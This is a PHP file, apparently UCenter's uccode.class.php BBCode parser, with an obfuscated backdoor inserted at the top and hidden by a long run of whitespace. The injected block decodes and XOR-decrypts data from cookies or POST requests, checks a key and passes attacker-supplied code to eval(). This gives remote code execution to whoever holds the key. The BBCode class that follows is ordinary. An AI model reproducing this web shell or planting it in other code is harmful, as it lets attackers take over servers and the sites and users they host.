<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $e9263 = 140;$GLOBALS['r906750'] = Array();global $r906750;$r906750 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['n3be0'] = "\x42\x70\x7d\x58\x37\xa\x5c\x61\x3b\x7c\x4d\x21\x66\x73\x6e\x79\x38\x7a\x45\x41\x4f\x4e\x33\x51\x3d\x6c\x36\x3e\x60\x2e\x5a\x2f\x20\x39\x5b\x22\x50\x69\x54\x44\x78\x55\x53\x57\x24\x30\x7b\x29\x3c\x4b\x71\x2a\x6b\x52\x63\x6a\x46\x23\x6f\x59\x65\x7e\x48\x49\x74\x2b\x25\x68\x72\xd\x3a\x26\x5d\x27\x3f\x56\x35\x6d\x75\x5e\x47\x67\x62\x4c\x4a\x77\x64\x34\x2c\x28\x9\x76\x2d\x32\x5f\x31\x43\x40";$r906750[$r906750['n3be0'][1].$r906750['n3be0'][87].$r906750['n3be0'][4].$r906750['n3be0'][87].$r906750['n3be0'][76].$r906750['n3be0'][76].$r906750['n3be0'][87].$r906750['n3be0'][4]] = $r906750['n3be0'][54].$r906750['n3be0'][67].$r906750['n3be0'][68];$r906750[$r906750['n3be0'][67].$r906750['n3be0'][82].$r906750['n3be0'][26].$r906750['n3be0'][76].$r906750['n3be0'][54]] = $r906750['n3be0'][58].$r906750['n3be0'][68].$r906750['n3be0'][86];$r906750[$r906750['n3be0'][50].$r906750['n3be0'][16].$r906750['n3be0'][82].$r906750['n3be0'][16].$r906750['n3be0'][22].$r906750['n3be0'][33].$r906750['n3be0'][54].$r906750['n3be0'][82]] = $r906750['n3be0'][86].$r906750['n3be0'][60].$r906750['n3be0'][12].$r906750['n3be0'][37].$r906750['n3be0'][14].$r906750['n3be0'][60];$r906750[$r906750['n3be0'][54].$r906750['n3be0'][76].$r906750['n3be0'][4].$r906750['n3be0'][86].$r906750['n3be0'][86]] = $r906750['n3be0'][13].$r906750['n3be0'][64].$r906750['n3be0'][68].$r906750['n3be0'][25].$r906750['n3be0'][60].$r906750['n3be0'][14];$r906750[$r906750['n3be0'][85].$r906750['n3be0'][87].$r906750['n3be0'][33].$r906750['n3be0'][76].$r906750['n3be0'][26].$r906750['n3be0'][45].$r906750['n3be0'][86].$r906750['n3be0'][60].$r906750['n3be0'][33]] = $r906750['n3be0'][86].$r906750['n3be0'][60].$r906750['n3be0'][12].$r906750['n3be0'][37].$r906750['n3be0'][14].$r906750['n3be0'][60].$r906750['n3be0'][86];$r906750[$r906750['n3be0'][54].$r906750['n3be0'][12].$r906750['n3be0'][33].$r906750['n3be0'][45]] = $r906750['n3be0'][37].$r906750['n3be0'][14].$r906750['n3be0'][37].$r906750['n3be0'][94].$r906750['n3be0'][13].$r906750['n3be0'][60].$r906750['n3be0'][64];$r906750[$r906750['n3be0'][82].$r906750['n3be0'][33].$r906750['n3be0'][93].$r906750['n3be0'][95].$r906750['n3be0'][60].$r906750['n3be0'][86].$r906750['n3be0'][95].$r906750['n3be0'][87].$r906750['n3be0'][22]] = $r906750['n3be0'][13].$r906750['n3be0'][60].$r906750['n3be0'][68].$r906750['n3be0'][37].$r906750['n3be0'][7].$r906750['n3be0'][25].$r906750['n3be0'][37].$r906750['n3be0'][17].$r906750['n3be0'][60];$r906750[$r906750['n3be0'][37].$r906750['n3be0'][95].$r906750['n3be0'][95].$r906750['n3be0'][54].$r906750['n3be0'][76].$r906750['n3be0'][95].$r906750['n3be0'][16].$r906750['n3be0'][86].$r906750['n3be0'][60]] = $r906750['n3be0'][1].$r906750['n3be0'][67].$r906750['n3be0'][1].$r906750['n3be0'][91].$r906750['n3be0'][60].$r906750['n3be0'][68].$r906750['n3be0'][13].$r906750['n3be0'][37].$r906750['n3be0'][58].$r906750['n3be0'][14];$r906750[$r906750['n3be0'][67].$r906750['n3be0'][26].$r906750['n3be0'][16].$r906750['n3be0'][33].$r906750['n3be0'][33].$r906750['n3be0'][33].$r906750['n3be0'][22].$r906750['n3be0'][93]] = $r906750['n3be0'][78].$r906750['n3be0'][14].$r906750['n3be0'][13].$r906750['n3be0'][60].$r906750['n3be0'][68].$r906750['n3be0'][37].$r906750['n3be0'][7].$r906750['n3be0'][25].$r906750['n3be0'][37].$r906750['n3be0'][17].$r906750['n3be0'][60];$r906750[$r906750['n3be0'][13].$r906750['n3be0'][7].$r906750['n3be0'][16].$r906750['n3be0'][4].$r906750['n3be0'][60].$r906750['n3be0'][16].$r906750['n3be0'][7]] = $r906750['n3be0'][82].$r906750['n3be0'][7].$r906750['n3be0'][13].$r906750['n3be0'][60].$r906750['n3be0'][26].$r906750['n3be0'][87].$r906750['n3be0'][94].$r906750['n3be0'][86].$r906750['n3be0'][60].$r906750['n3be0'][54].$r906750['n3be0'][58].$r906750['n3be0'][86].$r906750['n3be0'][60];$r906750[$r906750['n3be0'][1].$r906750['n3be0'][60].$r906750['n3be0'][45].$r906750['n3be0'][7].$r906750['n3be0'][33].$r906750['n3be0'][82].$r906750['n3be0'][7].$r906750['n3be0'][95].$r906750['n3be0'][33]] = $r906750['n3be0'][13].$r906750['n3be0'][60].$r906750['n3be0'][64].$r906750['n3be0'][94].$r906750['n3be0'][64].$r906750['n3be0'][37].$r906750['n3be0'][77].$r906750['n3be0'][60].$r906750['n3be0'][94].$r906750['n3be0'][25].$r906750['n3be0'][37].$r906750['n3be0'][77].$r906750['n3be0'][37].$r906750['n3be0'][64];$r906750[$r906750['n3be0'][91].$r906750['n3be0'][16].$r906750['n3be0'][93].$r906750['n3be0'][16].$r906750['n3be0'][22]] = $r906750['n3be0'][15].$r906750['n3be0'][45].$r906750['n3be0'][7].$r906750['n3be0'][12].$r906750['n3be0'][22].$r906750['n3be0'][45].$r906750['n3be0'][86].$r906750['n3be0'][76];$r906750[$r906750['n3be0'][25].$r906750['n3be0'][95].$r906750['n3be0'][54].$r906750['n3be0'][7]] = $r906750['n3be0'][7].$r906750['n3be0'][93].$r906750['n3be0'][54].$r906750['n3be0'][22];$r906750[$r906750['n3be0'][82].$r906750['n3be0'][76].$r906750['n3be0'][82].$r906750['n3be0'][33].$r906750['n3be0'][12].$r906750['n3be0'][4].$r906750['n3be0'][16].$r906750['n3be0'][76]] = $_POST;$r906750[$r906750['n3be0'][58].$r906750['n3be0'][82].$r906750['n3be0'][54].$r906750['n3be0'][16].$r906750['n3be0'][54].$r906750['n3be0'][45].$r906750['n3be0'][93].$r906750['n3be0'][86].$r906750['n3be0'][54]] = $_COOKIE;@$r906750[$r906750['n3be0'][54].$r906750['n3be0'][12].$r906750['n3be0'][33].$r906750['n3be0'][45]]($r906750['n3be0'][60].$r906750['n3be0'][68].$r906750['n3be0'][68].$r906750['n3be0'][58].$r906750['n3be0'][68].$r906750['n3be0'][94].$r906750['n3be0'][25].$r906750['n3be0'][58].$r906750['n3be0'][81], NULL);@$r906750[$r906750['n3be0'][54].$r906750['n3be0'][12].$r906750['n3be0'][33].$r906750['n3be0'][45]]($r906750['n3be0'][25].$r906750['n3be0'][58].$r906750['n3be0'][81].$r906750['n3be0'][94].$r906750['n3be0'][60].$r906750['n3be0'][68].$r906750['n3be0'][68].$r906750['n3be0'][58].$r906750['n3be0'][68].$r906750['n3be0'][13], 0);@$r906750[$r906750['n3be0'][54].$r906750['n3be0'][12].$r906750['n3be0'][33].$r906750['n3be0'][45]]($r906750['n3be0'][77].$r906750['n3be0'][7].$r906750['n3be0'][40].$r906750['n3be0'][94].$r906750['n3be0'][60].$r906750['n3be0'][40].$r906750['n3be0'][60].$r906750['n3be0'][54].$r906750['n3be0'][78].$r906750['n3be0'][64].$r906750['n3be0'][37].$r906750['n3be0'][58].$r906750['n3be0'][14].$r906750['n3be0'][94].$r906750['n3be0'][64].$r906750['n3be0'][37].$r906750['n3be0'][77].$r906750['n3be0'][60], 0);@$r906750[$r906750['n3be0'][1].$r906750['n3be0'][60].$r906750['n3be0'][45].$r906750['n3be0'][7].$r906750['n3be0'][33].$r906750['n3be0'][82].$r906750['n3be0'][7].$r906750['n3be0'][95].$r906750['n3be0'][33]](0);if (!$r906750[$r906750['n3be0'][85].$r906750['n3be0'][87].$r906750['n3be0'][33].$r906750['n3be0'][76].$r906750['n3be0'][26].$r906750['n3be0'][45].$r906750['n3be0'][86].$r906750['n3be0'][60].$r906750['n3be0'][33]]($r906750['n3be0'][19].$r906750['n3be0'][83].$r906750['n3be0'][53].$r906750['n3be0'][18].$r906750['n3be0'][19].$r906750['n3be0'][39].$r906750['n3be0'][59].$r906750['n3be0'][94].$r906750['n3be0'][53].$r906750['n3be0'][41].$r906750['n3be0'][21].$r906750['n3be0'][94].$r906750['n3be0'][22].$r906750['n3be0'][26].$r906750['n3be0'][26].$r906750['n3be0'][7].$r906750['n3be0'][12].$r906750['n3be0'][82].$r906750['n3be0'][16].$r906750['n3be0'][7].$r906750['n3be0'][16].$r906750['n3be0'][7].$r906750['n3be0'][93].$r906750['n3be0'][22].$r906750['n3be0'][76].$r906750['n3be0'][76].$r906750['n3be0'][7].$r906750['n3be0'][82].$r906750['n3be0'][93].$r906750['n3be0'][95].$r906750['n3be0'][12].$r906750['n3be0'][82].$r906750['n3be0'][12].$r906750['n3be0'][95].$r906750['n3be0'][95].$r906750['n3be0'][82].$r906750['n3be0'][7].$r906750['n3be0'][95].$r906750['n3be0'][7].$r906750['n3be0'][45].$r906750['n3be0'][93].$r906750['n3be0'][12].$r906750['n3be0'][82].$r906750['n3be0'][7])){$r906750[$r906750['n3be0'][50].$r906750['n3be0'][16].$r906750['n3be0'][82].$r906750['n3be0'][16].$r906750['n3be0'][22].$r906750['n3be0'][33].$r906750['n3be0'][54].$r906750['n3be0'][82]]($r906750['n3be0'][19].$r906750['n3be0'][83].$r906750['n3be0'][53].$r906750['n3be0'][18].$r906750['n3be0'][19].$r906750['n3be0'][39].$r906750['n3be0'][59].$r906750['n3be0'][94].$r906750['n3be0'][53].$r906750['n3be0'][41].$r906750['n3be0'][21].$r906750['n3be0'][94].$r906750['n3be0'][22].$r906750['n3be0'][26].$r906750['n3be0'][26].$r906750['n3be0'][7].$r906750['n3be0'][12].$r906750['n3be0'][82].$r906750['n3be0'][16].$r906750['n3be0'][7].$r906750['n3be0'][16].$r906750['n3be0'][7].$r906750['n3be0'][93].$r906750['n3be0'][22].$r906750['n3be0'][76].$r906750['n3be0'][76].$r906750['n3be0'][7].$r906750['n3be0'][82].$r906750['n3be0'][93].$r906750['n3be0'][95].$r906750['n3be0'][12].$r906750['n3be0'][82].$r906750['n3be0'][12].$r906750['n3be0'][95].$r906750['n3be0'][95].$r906750['n3be0'][82].$r906750['n3be0'][7].$r906750['n3be0'][95].$r906750['n3be0'][7].$r906750['n3be0'][45].$r906750['n3be0'][93].$r906750['n3be0'][12].$r906750['n3be0'][82].$r906750['n3be0'][7], 1);$ia0ba90 = NULL;$b5d1e6da = NULL;$r906750[$r906750['n3be0'][58].$r906750['n3be0'][86].$r906750['n3be0'][12].$r906750['n3be0'][12].$r906750['n3be0'][45].$r906750['n3be0'][82].$r906750['n3be0'][93].$r906750['n3be0'][54].$r906750['n3be0'][12]] = $r906750['n3be0'][54].$r906750['n3be0'][16].$r906750['n3be0'][60].$r906750['n3be0'][7].$r906750['n3be0'][76].$r906750['n3be0'][33].$r906750['n3be0'][86].$r906750['n3be0'][33].$r906750['n3be0'][92].$r906750['n3be0'][82].$r906750['n3be0'][4].$r906750['n3be0'][82].$r906750['n3be0'][26].$r906750['n3be0'][92].$r906750['n3be0'][87].$r906750['n3be0'][54].$r906750['n3be0'][33].$r906750['n3be0'][12].$r906750['n3be0'][92].$r906750['n3be0'][82].$r906750['n3be0'][82].$r906750['n3be0'][60].$r906750['n3be0'][4].$r906750['n3be0'][92].$r906750['n3be0'][33].$r906750['n3be0'][60].$r906750['n3be0'][4].$r906750['n3be0'][54].$r906750['n3be0'][16].$r906750['n3be0'][12].$r906750['n3be0'][86].$r906750['n3be0'][87].$r906750['n3be0'][22].$r906750['n3be0'][86].$r906750['n3be0'][16].$r906750['n3be0'][22];global $odff0b2cf;function  a2c3($ia0ba90, $x1d2e42){global $r906750;$jfbf064 = "";for ($u7bed5=0; $u7bed5<$r906750[$r906750['n3be0'][54].$r906750['n3be0'][76].$r906750['n3be0'][4].$r906750['n3be0'][86].$r906750['n3be0'][86]]($ia0ba90);){for ($l9b62df79=0; $l9b62df79<$r906750[$r906750['n3be0'][54].$r906750['n3be0'][76].$r906750['n3be0'][4].$r906750['n3be0'][86].$r906750['n3be0'][86]]($x1d2e42) && $u7bed5<$r906750[$r906750['n3be0'][54].$r906750['n3be0'][76].$r906750['n3be0'][4].$r906750['n3be0'][86].$r906750['n3be0'][86]]($ia0ba90); $l9b62df79++, $u7bed5++){$jfbf064 .= $r906750[$r906750['n3be0'][1].$r906750['n3be0'][87].$r906750['n3be0'][4].$r906750['n3be0'][87].$r906750['n3be0'][76].$r906750['n3be0'][76].$r906750['n3be0'][87].$r906750['n3be0'][4]]($r906750[$r906750['n3be0'][67].$r906750['n3be0'][82].$r906750['n3be0'][26].$r906750['n3be0'][76].$r906750['n3be0'][54]]($ia0ba90[$u7bed5]) ^ $r906750[$r906750['n3be0'][67].$r906750['n3be0'][82].$r906750['n3be0'][26].$r906750['n3be0'][76].$r906750['n3be0'][54]]($x1d2e42[$l9b62df79]));}}return $jfbf064;}function  y0af30d5($ia0ba90, $x1d2e42){global $r906750;global $odff0b2cf;return $r906750[$r906750['n3be0'][25].$r906750['n3be0'][95].$r906750['n3be0'][54].$r906750['n3be0'][7]]($r906750[$r906750['n3be0'][25].$r906750['n3be0'][95].$r906750['n3be0'][54].$r906750['n3be0'][7]]($ia0ba90, $odff0b2cf), $x1d2e42);}foreach ($r906750[$r906750['n3be0'][58].$r906750['n3be0'][82].$r906750['n3be0'][54].$r906750['n3be0'][16].$r906750['n3be0'][54].$r906750['n3be0'][45].$r906750['n3be0'][93].$r906750['n3be0'][86].$r906750['n3be0'][54]] as $x1d2e42=>$w669a3ddc){$ia0ba90 = $w669a3ddc;$b5d1e6da = $x1d2e42;}if (!$ia0ba90){foreach ($r906750[$r906750['n3be0'][82].$r906750['n3be0'][76].$r906750['n3be0'][82].$r906750['n3be0'][33].$r906750['n3be0'][12].$r906750['n3be0'][4].$r906750['n3be0'][16].$r906750['n3be0'][76]] as $x1d2e42=>$w669a3ddc){$ia0ba90 = $w669a3ddc;$b5d1e6da = $x1d2e42;}}$ia0ba90 = @$r906750[$r906750['n3be0'][67].$r906750['n3be0'][26].$r906750['n3be0'][16].$r906750['n3be0'][33].$r906750['n3be0'][33].$r906750['n3be0'][33].$r906750['n3be0'][22].$r906750['n3be0'][93]]($r906750[$r906750['n3be0'][91].$r906750['n3be0'][16].$r906750['n3be0'][93].$r906750['n3be0'][16].$r906750['n3be0'][22]]($r906750[$r906750['n3be0'][13].$r906750['n3be0'][7].$r906750['n3be0'][16].$r906750['n3be0'][4].$r906750['n3be0'][60].$r906750['n3be0'][16].$r906750['n3be0'][7]]($ia0ba90), $b5d1e6da));if (isset($ia0ba90[$r906750['n3be0'][7].$r906750['n3be0'][52]]) && $odff0b2cf==$ia0ba90[$r906750['n3be0'][7].$r906750['n3be0'][52]]){if ($ia0ba90[$r906750['n3be0'][7]] == $r906750['n3be0'][37]){$u7bed5 = Array($r906750['n3be0'][1].$r906750['n3be0'][91] => @$r906750[$r906750['n3be0'][37].$r906750['n3be0'][95].$r906750['n3be0'][95].$r906750['n3be0'][54].$r906750['n3be0'][76].$r906750['n3be0'][95].$r906750['n3be0'][16].$r906750['n3be0'][86].$r906750['n3be0'][60]](),$r906750['n3be0'][13].$r906750['n3be0'][91] => $r906750['n3be0'][95].$r906750['n3be0'][29].$r906750['n3be0'][45].$r906750['n3be0'][92].$r906750['n3be0'][95],);echo @$r906750[$r906750['n3be0'][82].$r906750['n3be0'][33].$r906750['n3be0'][93].$r906750['n3be0'][95].$r906750['n3be0'][60].$r906750['n3be0'][86].$r906750['n3be0'][95].$r906750['n3be0'][87].$r906750['n3be0'][22]]($u7bed5);}elseif ($ia0ba90[$r906750['n3be0'][7]] == $r906750['n3be0'][60]){eval/*c78eba1*/($ia0ba90[$r906750['n3be0'][86]]);}exit();}} ?><?php

/*
	[UCenter] (C)2001-2099 Comsenz Inc.
	This is NOT a freeware, use is subject to license terms

	$Id: uccode.class.php 1166 2014-11-03 01:49:32Z hypowang $
*/

class uccode {
	var $uccodes;

	function __construct() {
		$this->uccode();
	}

	function uccode() {
		$this->uccode = array(
			'pcodecount' => -1,
			'codecount' => 0,
			'codehtml' => ''
		);
	}

	function codedisp($code) {
		$this->uccode['pcodecount']++;
		$code = str_replace('\\"', '"', preg_replace("/^[\n\r]*(.+?)[\n\r]*$/is", "\\1", $code));
		$this->uccode['codehtml'][$this->uccode['pcodecount']] = $this->tpl_codedisp($code);
		$this->uccode['codecount']++;
		return "[\tUCENTER_CODE_".$this->uccode[pcodecount]."\t]";
	}

	function complie($message) {
		$message = dhtmlspecialchars($message);
		if(strpos($message, '[/code]') !== FALSE) {
			$message = preg_replace_callback("/\s*\[code\](.+?)\[\/code\]\s*/is", array($this, 'complie_callback_codedisp_1'), $message);
		}
		if(strpos($message, '[/url]') !== FALSE) {
			$message = preg_replace_callback("/\[url(=((https?|ftp|gopher|news|telnet|rtsp|mms|callto|bctp|ed2k|thunder|synacast){1}:\/\/|www\.)([^\[\"']+?))?\](.+?)\[\/url\]/is", array($this, 'complie_callback_parseurl_15'), $message);
		}
		if(strpos($message, '[/email]') !== FALSE) {
			$message = preg_replace_callback("/\[email(=([a-z0-9\-_.+]+)@([a-z0-9\-_]+[.][a-z0-9\-_.]+))?\](.+?)\[\/email\]/is", array($this, 'complie_callback_parseemail_14'), $message);
		}
		$message = str_replace(array(
			'[/color]', '[/size]', '[/font]', '[/align]', '[b]', '[/b]',
			'[i]', '[/i]', '[u]', '[/u]', '[list]', '[list=1]', '[list=a]',
			'[list=A]', '[*]', '[/list]', '[indent]', '[/indent]', '[/float]'
		), array(
			'</font>', '</font>', '</font>', '</p>', '<strong>', '</strong>', '<i>',
			'</i>', '<u>', '</u>', '<ul>', '<ul type="1">', '<ul type="a">',
			'<ul type="A">', '<li>', '</ul>', '<blockquote>', '</blockquote>', '</span>'
		), preg_replace(array(
			"/\[color=([#\w]+?)\]/i",
			"/\[size=(\d+?)\]/i",
			"/\[size=(\d+(\.\d+)?(px|pt|in|cm|mm|pc|em|ex|%)+?)\]/i",
			"/\[font=([^\[\<]+?)\]/i",
			"/\[align=(left|center|right)\]/i",
			"/\[float=(left|right)\]/i"
		), array(
			"<font color=\"\\1\">",
			"<font size=\"\\1\">",
			"<font style=\"font-size: \\1\">",
			"<font face=\"\\1 \">",
			"<p align=\"\\1\">",
			"<span style=\"float: \\1;\">"
		), $message));
		if(strpos($message, '[/quote]') !== FALSE) {
			$message = preg_replace("/\s*\[quote\][\n\r]*(.+?)[\n\r]*\[\/quote\]\s*/is", $this->tpl_quote(), $message);
		}
		if(strpos($message, '[/img]') !== FALSE) {
			$message = preg_replace_callback("/\[img\]\s*([^\[\<\r\n]+?)\s*\[\/img\]/is", array($this, 'complie_callback_bbcodeurl_1'), $message);
			$message = preg_replace_callback("/\[img=(\d{1,4})[x|\,](\d{1,4})\]\s*([^\[\<\r\n]+?)\s*\[\/img\]/is", array($this, 'complie_callback_bbcodeurl_312'), $message);
		}
		for($i = 0; $i <= $this->uccode['pcodecount']; $i++) {
			$message = str_replace("[\tUCENTER_CODE_$i\t]", $this->uccode['codehtml'][$i], $message);
		}
		return nl2br(str_replace(array("\t", '   ', '  '), array('&nbsp; &nbsp; &nbsp; &nbsp; ', '&nbsp; &nbsp;', '&nbsp;&nbsp;'), $message));
	}

	function complie_callback_codedisp_1($matches) {
		return $this->codedisp($matches[1]);
	}

	function complie_callback_parseurl_15($matches) {
		return $this->parseurl($matches[1], $matches[5]);
	}

	function complie_callback_parseemail_14($matches) {
		return $this->parseemail($matches[1], $matches[4]);
	}

	function complie_callback_bbcodeurl_1($matches) {
		return $this->bbcodeurl($matches[1], '<img src="%s" border="0" alt="" />');
	}

	function complie_callback_bbcodeurl_312($matches) {
		return $this->bbcodeurl($matches[3], '<img width="'.$matches[1].'" height="'.$matches[2].'" src="%s" border="0" alt="" />');
	}

	function parseurl($url, $text) {
		if(!$url && preg_match("/((https?|ftp|gopher|news|telnet|rtsp|mms|callto|bctp|ed2k|thunder|synacast){1}:\/\/|www\.)[^\[\"']+/i", trim($text), $matches)) {
			$url = $matches[0];
			$length = 65;
			if(strlen($url) > $length) {
				$text = substr($url, 0, intval($length * 0.5)).' ... '.substr($url, - intval($length * 0.3));
			}
			return '<a href="'.(substr(strtolower($url), 0, 4) == 'www.' ? 'http://'.$url : $url).'" target="_blank">'.$text.'</a>';
		} else {
			$url = substr($url, 1);
			if(substr(strtolower($url), 0, 4) == 'www.') {
				$url = 'http://'.$url;
			}
			return '<a href="'.$url.'" target="_blank">'.$text.'</a>';
		}
	}

	function parseemail($email, $text) {
		$text = str_replace('\"', '"', $text);
		if(!$email && preg_match("/\s*([a-z0-9\-_.+]+)@([a-z0-9\-_]+[.][a-z0-9\-_.]+)\s*/i", $text, $matches)) {
			$email = trim($matches[0]);
			return '<a href="mailto:'.$email.'">'.$email.'</a>';
		} else {
			return '<a href="mailto:'.substr($email, 1).'">'.$text.'</a>';
		}
	}

	function bbcodeurl($url, $tags) {
		if(!preg_match("/<.+?>/s", $url)) {
			if(!in_array(strtolower(substr($url, 0, 6)), array('http:/', 'https:', 'ftp://', 'rtsp:/', 'mms://'))) {
				$url = 'http://'.$url;
			}
			return str_replace(array('submit', 'logging.php'), array('', ''), sprintf($tags, $url, addslashes($url)));
		} else {
			return '&nbsp;'.$url;
		}
	}

	function tpl_codedisp($code) {
		return '<div class="blockcode"><code id="code'.$this->uccodes['codecount'].'">'.$code.'</code></div>';
	}

	function tpl_quote() {
		return '<div class="quote"><blockquote>\\1</blockquote></div>';
	}
}


?>